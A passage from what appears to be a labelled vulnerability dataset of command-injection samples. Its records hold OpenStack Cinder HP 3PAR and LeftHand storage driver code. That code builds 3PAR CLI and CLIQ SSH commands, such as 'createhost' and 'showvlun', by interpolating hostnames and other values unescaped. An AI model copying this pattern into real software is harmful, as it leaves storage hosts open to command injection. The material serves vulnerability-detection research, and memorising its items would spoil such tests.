       iscsi_iqn,\n                                              0))\n\n        return model_update\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"Creates a volume from a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def create_snapshot(self, snapshot):\n        \"\"\"Creates a snapshot.\"\"\"\n        raise NotImplementedError()\n\n    def delete_volume(self, volume):\n        \"\"\"Deletes a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['prompt'] = 'false'  # Don't confirm\n        try:\n            volume_info = self._cliq_get_volume_info(volume['name'])\n        except exception.ProcessExecutionError:\n            LOG.error(\"Volume did not exist. It will not be deleted\")\n            return\n        self._cliq_run_xml(\"deleteVolume\", cliq_args)\n\n    def local_path(self, volume):\n        msg = _(\"local_path not supported\")\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host. HP VSA requires a volume to be assigned\n        to a server.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        \"\"\"\n        self._create_server(connector)\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"assignVolumeToServer\", cliq_args)\n\n        iscsi_properties = self._get_iscsi_properties(volume)\n        return {\n            'driver_volume_type': 'iscsi',\n            'data': iscsi_properties\n        }\n\n    def _create_server(self, connector):\n        cliq_args = {}\n        cliq_args['serverName'] = connector['host']\n        out = self._cliq_run_xml(\"getServerInfo\", cliq_args, False)\n        response = out.find(\"response\")\n        result = response.attrib.get(\"result\")\n        if result != '0':\n            cliq_args = {}\n            cliq_args['serverName'] = connector['host']\n            cliq_args['initiator'] = connector['initiator']\n            self._cliq_run_xml(\"createServer\", cliq_args)\n\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Unassign the volume from the host.\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume['name']\n        cliq_args['serverName'] = connector['host']\n        self._cliq_run_xml(\"unassignVolumeToServer\", cliq_args)\n\n    def get_volume_stats(self, refresh):\n        if refresh:\n            self._update_backend_status()\n\n        return self.device_stats\n\n    def _update_backend_status(self):\n        data = {}\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        data['volume_backend_name'] = backend_name or self.__class__.__name__\n        data['driver_version'] = '1.0'\n        data['reserved_percentage'] = 0\n        data['storage_protocol'] = 'iSCSI'\n        data['vendor_name'] = 'Hewlett-Packard'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", {})\n        cluster_node = result_xml.find(\"response/cluster\")\n        total_capacity = cluster_node.attrib.get(\"spaceTotal\")\n        free_capacity = cluster_node.attrib.get(\"unprovisionedSpace\")\n        GB = 1073741824\n\n        data['total_capacity_gb'] = int(total_capacity) / GB\n        data['free_capacity_gb'] = int(free_capacity) / GB\n        self.device_stats = data\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "c55589b131828f3a595903f6796cb2d0babb772f", "code": "/cinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR Fibre Channel Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver\n\"\"\"\n\nfrom hp3parclient import exceptions as hpexceptions\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\n\n\nclass HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):\n    \"\"\"OpenStack Fibre Channel driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware,\n              copy volume <--> Image.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(HP3PARFCDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password',\n                          'san_ip', 'san_login', 'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'FC'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        The  driver returns a driver_volume_type of 'fibre_channel'.\n        The target_wwn can be a single entry or a list of wwns that\n        correspond to the list of remote wwn(s) that will export the volume.\n        Example return values:\n\n            {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': '1234567890123',\n                }\n            }\n\n            or\n\n             {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': ['1234567890123', '0987654321321'],\n                }\n            }\n\n\n        Steps to export a volume on 3PAR\n          * Create a host on the 3par with the target wwn\n          * Create a VLUN for that HOST with the volume we want to export.\n\n        \"\"\"\n        self.common.client_login()\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        ports = self.common.get_ports()\n\n        self.common.client_logout()\n        info = {'driver_volume_type': 'fibre_channel',\n                'data': {'target_lun': vlun['lun'],\n                         'target_discovered': True,\n                         'target_wwn': ports['FC']}}\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['wwpns'])\n        self.common.client_logout()\n\n    def _create_3par_fibrechan_host(self, hostname, wwn, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same wwn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        out = self.common._cli_run('createhost -persona %s -domain %s %s %s'\n                                   % (persona_id, domain,\n                                      hostname, \" \".join(wwn)), None)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n\n        return hostname\n\n    def _modify_3par_fibrechan_host(self, hostname, wwn):\n        # when using -add, you can not send the persona or domain options\n        out = self.common._cli_run('createhost -add %s %s'\n                                   % (hostname, \" \".join(wwn)), None)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['FCPaths']:\n                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound as ex:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_fibrechan_host(hostname,\n                                                        connector['wwpns'],\n                                                        domain,\n                                                        persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/n/cinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR iSCSI Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver\n\"\"\"\n\nimport sys\n\nfrom hp3parclient import exceptions as hpexceptions\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\nDEFAULT_ISCSI_PORT = 3260\n\n\nclass HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):\n    \"\"\"OpenStack iSCSI driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware.\n\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password', 'san_ip', 'san_login',\n                          'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'iSCSI'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n\n        # map iscsi_ip-> ip_port\n        #             -> iqn\n        #             -> nsp\n        self.iscsi_ips = {}\n        temp_iscsi_ip = {}\n\n        # use the 3PAR ip_addr list for iSCSI configuration\n        if len(self.configuration.hp3par_iscsi_ips) > 0:\n            # add port values to ip_addr, if necessary\n            for ip_addr in self.configuration.hp3par_iscsi_ips:\n                ip = ip_addr.split(':')\n                if len(ip) == 1:\n                    temp_iscsi_ip[ip_addr] = {'ip_port': DEFAULT_ISCSI_PORT}\n                elif len(ip) == 2:\n                    temp_iscsi_ip[ip[0]] = {'ip_port': ip[1]}\n                else:\n                    msg = _(\"Invalid IP address format '%s'\") % ip_addr\n                    LOG.warn(msg)\n\n        # add the single value iscsi_ip_address option to the IP dictionary.\n        # This way we can see if it's a valid iSCSI IP. If it's not valid,\n        # we won't use it and won't bother to report it, see below\n        if (self.configuration.iscsi_ip_address not in temp_iscsi_ip):\n            ip = self.configuration.iscsi_ip_address\n            ip_port = self.configuration.iscsi_port\n            temp_iscsi_ip[ip] = {'ip_port': ip_port}\n\n        # get all the valid iSCSI ports from 3PAR\n        # when found, add the valid iSCSI ip, ip port, iqn and nsp\n        # to the iSCSI IP dictionary\n        # ...this will also make sure ssh works.\n        iscsi_ports = self.common.get_ports()['iSCSI']\n        for (ip, iscsi_info) in iscsi_ports.iteritems():\n            if ip in temp_iscsi_ip:\n                ip_port = temp_iscsi_ip[ip]['ip_port']\n                self.iscsi_ips[ip] = {'ip_port': ip_port,\n                                      'nsp': iscsi_info['nsp'],\n                                      'iqn': iscsi_info['iqn']\n                                      }\n                del temp_iscsi_ip[ip]\n\n        # if the single value iscsi_ip_address option is still in the\n        # temp dictionary it's because it defaults to $my_ip which doesn't\n        # make sense in this context. So, if present, remove it and move on.\n        if (self.configuration.iscsi_ip_address in temp_iscsi_ip):\n            del temp_iscsi_ip[self.configuration.iscsi_ip_address]\n\n        # lets see if there are invalid iSCSI IPs left in the temp dict\n        if len(temp_iscsi_ip) > 0:\n            msg = _(\"Found invalid iSCSI IP address(s) in configuration \"\n                    \"option(s) hp3par_iscsi_ips or iscsi_ip_address '%s.'\") % \\\n                   (\", \".join(temp_iscsi_ip))\n            LOG.warn(msg)\n\n        if not len(self.iscsi_ips) > 0:\n            msg = _('At least one valid iSCSI IP address must be set.')\n            raise exception.InvalidInput(reason=(msg))\n\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        \"\"\"Clone an existing volume.\"\"\"\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        This driver returns a driver_volume_type of 'iscsi'.\n        The format of the driver data is defined in _get_iscsi_properties.\n        Example return value:\n\n            {\n                'driver_volume_type': 'iscsi'\n                'data': {\n                    'target_discovered': True,\n                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',\n                    'target_protal': '127.0.0.1:3260',\n                    'volume_id': 1,\n                }\n            }\n\n        Steps to export a volume on 3PAR\n          * Get the 3PAR iSCSI iqn\n          * Create a host on the 3par\n          * create vlun on the 3par\n        \"\"\"\n        self.common.client_login()\n\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        self.common.client_logout()\n\n        iscsi_ip = self._get_iscsi_ip(host['name'])\n        iscsi_ip_port = self.iscsi_ips[iscsi_ip]['ip_port']\n        iscsi_target_iqn = self.iscsi_ips[iscsi_ip]['iqn']\n        info = {'driver_volume_type': 'iscsi',\n                'data': {'target_portal': \"%s:%s\" %\n                         (iscsi_ip, iscsi_ip_port),\n                         'target_iqn': iscsi_target_iqn,\n                         'target_lun': vlun['lun'],\n                         'target_discovered': True\n                         }\n                }\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['initiator'])\n        self.common.client_logout()\n\n    def _create_3par_iscsi_host(self, hostname, iscsi_iqn, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same iqn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        cmd = 'createhost -iscsi -persona %s -domain %s %s %s' % \\\n              (persona_id, domain, hostname, iscsi_iqn)\n        out = self.common._cli_run(cmd, None)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n        return hostname\n\n    def _modify_3par_iscsi_host(self, hostname, iscsi_iqn):\n        # when using -add, you can not send the persona or domain options\n        self.common._cli_run('createhost -iscsi -add %s %s'\n                             % (hostname, iscsi_iqn), None)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        # make sure we don't have the host already\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['iSCSIPaths']:\n                self._modify_3par_iscsi_host(hostname, connector['initiator'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_iscsi_host(hostname,\n                                                    connector['initiator'],\n                                                    domain,\n                                                    persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def _get_iscsi_ip(self, hostname):\n        \"\"\"Get an iSCSI IP address to use.\n\n        Steps to determine which IP address to use.\n          * If only one IP address, return it\n          * If there is an active vlun, return the IP associated with it\n          * Return IP with fewest active vluns\n        \"\"\"\n        if len(self.iscsi_ips) == 1:\n            return self.iscsi_ips.keys()[0]\n\n        # if we currently have an active port, use it\n        nsp = self._get_active_nsp(hostname)\n\n        if nsp is None:\n            # no active vlun, find least busy port\n            nsp = self._get_least_used_nsp(self._get_iscsi_nsps())\n            if nsp is None:\n                msg = _(\"Least busy iSCSI port not found, \"\n                        \"using first iSCSI port in list.\")\n                LOG.warn(msg)\n                return self.iscsi_ips.keys()[0]\n\n        return self._get_ip_using_nsp(nsp)\n\n    def _get_iscsi_nsps(self):\n        \"\"\"Return the list of candidate nsps.\"\"\"\n        nsps = []\n        for value in self.iscsi_ips.values():\n            nsps.append(value['nsp'])\n        return nsps\n\n    def _get_ip_using_nsp(self, nsp):\n        \"\"\"Return IP assiciated with given nsp.\"\"\"\n        for (key, value) in self.iscsi_ips.items():\n            if value['nsp'] == nsp:\n                return key\n\n    def _get_active_nsp(self, hostname):\n        \"\"\"Return the active nsp, if one exists, for the given host.\"\"\"\n        result = self.common._cli_run('showvlun -a -host %s' % hostname, None)\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                info = line.split(\",\")\n                if info and len(info) > 4:\n                    return info[4]\n\n    def _get_least_used_nsp(self, nspss):\n        \"\"\"\"Return the nsp that has the fewest active vluns.\"\"\"\n        # return only the nsp (node:server:port)\n        result = self.common._cli_run('showvlun -a -showcols Port', None)\n\n        # count the number of nsps (there is 1 for each active vlun)\n        nsp_counts = {}\n        for nsp in nspss:\n            # initialize counts to zero\n            nsp_counts[nsp] = 0\n\n        current_least_used_nsp = None\n        if result:\n            # first line is header\n            result = result[1:]\n            for line in result:\n                nsp = line.strip()\n                if nsp in nsp_counts:\n                    nsp_counts[nsp] = nsp_counts[nsp] + 1\n\n            # identify key (nsp) of least used nsp\n            current_smallest_count = sys.maxint\n            for (nsp, count) in nsp_counts.iteritems():\n                if count < current_smallest_count:\n                    current_least_used_nsp = nsp\n                    current_smallest_count = count\n\n        return current_least_used_nsp\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/n/cinder/volume/drivers/san/hp_lefthand.py/n/n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nHP Lefthand SAN ISCSI Driver.\n\nThe driver communicates to the backend aka Cliq via SSH to perform all the\noperations on the SAN.\n\"\"\"\nfrom lxml import etree\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder.volume.drivers.san.san import SanISCSIDriver\n\n\nLOG = logging.getLogger(__name__)\n\n\nclass HpSanISCSIDriver(SanISCSIDriver):\n    \"\"\"Executes commands relating to HP/Lefthand SAN ISCSI volumes.\n\n    We use the CLIQ interface, over SSH.\n\n    Rough overview of CLIQ commands used:\n\n    :createVolume:    (creates the volume)\n\n    :getVolumeInfo:    (to discover the IQN etc)\n\n    :getClusterInfo:    (to discover the iSCSI target IP address)\n\n    :assignVolumeChap:    (exports it with CHAP security)\n\n    The 'trick' here is that the HP SAN enforces security by default, so\n    normally a volume mount would need both to configure the SAN in the volume\n    layer and do the mount on the compute layer.  Multi-layer operations are\n    not catered for at the moment in the cinder architecture, so instead we\n    share the volume using CHAP at volume creation time.  Then the mount need\n    only use those CHAP credentials, so can take place exclusively in the\n    compute layer.\n    \"\"\"\n\n    device_stats = {}\n\n    def __init__(self, *args, **kwargs):\n        super(HpSanISCSIDriver, self).__init__(*args, **kwargs)\n        self.cluster_vip = None\n\n    def _cliq_run(self, verb, cliq_args, check_exit_code=True):\n        \"\"\"Runs a CLIQ command over SSH, without doing any result parsing\"\"\"\n        cliq_arg_strings = []\n        for k, v in cliq_args.items():\n            cliq_arg_strings.append(\" %s=%s\" % (k, v))\n        cmd = verb + ''.join(cliq_arg_strings)\n\n        return self._run_ssh(cmd, check_exit_code)\n\n    def _cliq_run_xml(self, verb, cliq_args, check_cliq_result=True):\n        \"\"\"Runs a CLIQ command over SSH, parsing and checking the output\"\"\"\n        cliq_args['output'] = 'XML'\n        (out, _err) = self._cliq_run(verb, cliq_args, check_cliq_result)\n\n        LOG.debug(_(\"CLIQ command returned %s\"), out)\n\n        result_xml = etree.fromstring(out)\n        if check_cliq_result:\n            response_node = result_xml.find(\"response\")\n            if response_node is None:\n                msg = (_(\"Malformed response to CLIQ command \"\n                         \"%(verb)s %(cliq_args)s. Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n            result_code = response_node.attrib.get(\"result\")\n\n            if result_code != \"0\":\n                msg = (_(\"Error running CLIQ command %(verb)s %(cliq_args)s. \"\n                         \" Result=%(out)s\") %\n                       {'verb': verb, 'cliq_args': cliq_args, 'out': out})\n                raise exception.VolumeBackendAPIException(data=msg)\n\n        return result_xml\n\n    def _cliq_get_cluster_info(self, cluster_name):\n        \"\"\"Queries for info about the cluster (including IP)\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = cluster_name\n        cliq_args['searchDepth'] = '1'\n        cliq_args['verbose'] = '0'\n\n        result_xml = self._cliq_run_xml(\"getClusterInfo\", cliq_args)\n\n        return result_xml\n\n    def _cliq_get_cluster_vip(self, cluster_name):\n        \"\"\"Gets the IP on which a cluster shares iSCSI volumes\"\"\"\n        cluster_xml = self._cliq_get_cluster_info(cluster_name)\n\n        vips = []\n        for vip in cluster_xml.findall(\"response/cluster/vip\"):\n            vips.append(vip.attrib.get('ipAddress'))\n\n        if len(vips) == 1:\n            return vips[0]\n\n        _xml = etree.tostring(cluster_xml)\n        msg = (_(\"Unexpected number of virtual ips for cluster \"\n                 \" %(cluster_name)s. Result=%(_xml)s\") %\n               {'cluster_name': cluster_name, '_xml': _xml})\n        raise exception.VolumeBackendAPIException(data=msg)\n\n    def _cliq_get_volume_info(self, volume_name):\n        \"\"\"Gets the volume info, including IQN\"\"\"\n        cliq_args = {}\n        cliq_args['volumeName'] = volume_name\n        result_xml = self._cliq_run_xml(\"getVolumeInfo\", cliq_args)\n\n        # Result looks like this:\n        #<gauche version=\"1.0\">\n        #  <response description=\"Operation succeeded.\" name=\"CliqSuccess\"\n        #            processingTime=\"87\" result=\"0\">\n        #    <volume autogrowPages=\"4\" availability=\"online\" blockSize=\"1024\"\n        #       bytesWritten=\"0\" checkSum=\"false\" clusterName=\"Cluster01\"\n        #       created=\"2011-02-08T19:56:53Z\" deleting=\"false\" description=\"\"\n        #       groupName=\"Group01\" initialQuota=\"536870912\" isPrimary=\"true\"\n        #       iscsiIqn=\"iqn.2003-10.com.lefthandnetworks:group01:25366:vol-b\"\n        #       maxSize=\"6865387257856\" md5=\"9fa5c8b2cca54b2948a63d833097e1ca\"\n        #       minReplication=\"1\" name=\"vol-b\" parity=\"0\" replication=\"2\"\n        #       reserveQuota=\"536870912\" scratchQuota=\"4194304\"\n        #       serialNumber=\"9fa5c8b2cca54b2948a63d833097e1ca0000000000006316\"\n        #       size=\"1073741824\" stridePages=\"32\" thinProvision=\"true\">\n        #      <status description=\"OK\" value=\"2\"/>\n        #      <permission access=\"rw\"\n        #            authGroup=\"api-34281B815713B78-(trimmed)51ADD4B7030853AA7\"\n        #            chapName=\"chapusername\" chapRequired=\"true\" id=\"25369\"\n        #            initiatorSecret=\"\" iqn=\"\" iscsiEnabled=\"true\"\n        #            loadBalance=\"true\" targetSecret=\"supersecret\"/>\n        #    </volume>\n        #  </response>\n        #</gauche>\n\n        # Flatten the nodes into a dictionary; use prefixes to avoid collisions\n        volume_attributes = {}\n\n        volume_node = result_xml.find(\"response/volume\")\n        for k, v in volume_node.attrib.items():\n            volume_attributes[\"volume.\" + k] = v\n\n        status_node = volume_node.find(\"status\")\n        if status_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"status.\" + k] = v\n\n        # We only consider the first permission node\n        permission_node = volume_node.find(\"permission\")\n        if permission_node is not None:\n            for k, v in status_node.attrib.items():\n                volume_attributes[\"permission.\" + k] = v\n\n        LOG.debug(_(\"Volume info: %(volume_name)s => %(volume_attributes)s\") %\n                  {'volume_name': volume_name,\n                   'volume_attributes': volume_attributes})\n        return volume_attributes\n\n    def create_volume(self, volume):\n        \"\"\"Creates a volume.\"\"\"\n        cliq_args = {}\n        cliq_args['clusterName'] = self.configuration.san_clustername\n\n        if self.configuration.san_thin_provision:\n            cliq_args['thinProvision'] = '1'\n        else:\n            cliq_args['thinProvision'] = 